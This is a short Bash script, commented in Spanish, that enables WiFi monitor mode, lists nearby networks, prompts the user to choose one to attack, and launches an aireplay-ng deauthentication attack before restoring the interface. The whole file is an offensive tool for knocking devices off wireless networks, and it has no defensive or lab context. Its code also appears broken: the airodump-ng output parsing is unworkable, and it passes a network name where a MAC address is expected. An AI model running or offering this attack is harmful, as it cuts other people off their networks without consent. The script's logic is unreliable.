#!/bin/bash

# Colores
RED="\033[1;31m"  
GREEN="\033[1;32m"
YELLOW="\033[1;33m" 
WHITE="\033[1;37m"

# Interfaz WiFi 
IFACE="wlan0"

# Pone interfaz en modo monitor
enable_monitor() {

  airmon-ng check kill
  ip link set $IFACE down
  iw dev $IFACE set type monitor
  ip link set $IFACE up

}

# Regresa la interfaz a modo normal
disable_monitor() {

  ip link set $IFACE down
  iw dev $IFACE set type managed
  ip link set $IFACE up
  service network-manager restart
  nmcli device connect $IFACE

}

# Encuentra las redes WiFi cercanas  
get_targets() {

  echo -e "\n${WHITE}Buscando redes WiFi disponibles...${WHITE}\n"

  networks=($(airodump-ng -a --band abg $IFACE | grep -w ESSID | awk -F' ' '{print $2}'))

  echo -e "${WHITE}Redes Encontradas:\n"

  for ((i=0; i<${#networks[@]}; i++)); do
    echo -e "${RED}$i) ${networks[$i]}"
  done 

}

# Realiza el ataque deauth
attack() {

  echo -e "\n${RED}[+] ${WHITE}Iniciando ataque Deauth a ${YELLOW}$1${WHITE}"

  timeout 60s aireplay-ng -0 2 -a $1 $IFACE
  
  echo -e "\n${GREEN}[+] ${WHITE}Ataque finalizado!${WHITE}\n"  

}

# Flujo principal
enable_monitor
get_targets

read -p "Ingresa el número de red a atacar: " target
SSID=${networks[$target]}  

attack $SSID

disable_monitor
